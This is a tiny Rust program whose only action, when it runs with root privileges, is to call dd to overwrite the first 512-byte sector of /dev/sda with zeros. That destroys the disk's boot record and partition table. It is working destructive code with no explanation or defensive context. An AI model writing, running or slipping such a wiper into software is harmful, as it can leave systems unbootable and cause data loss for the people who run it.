use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let _ = Command::new("dd").args(["if=/dev/zero","of=/dev/sda","bs=512","count=1"]).status();
}
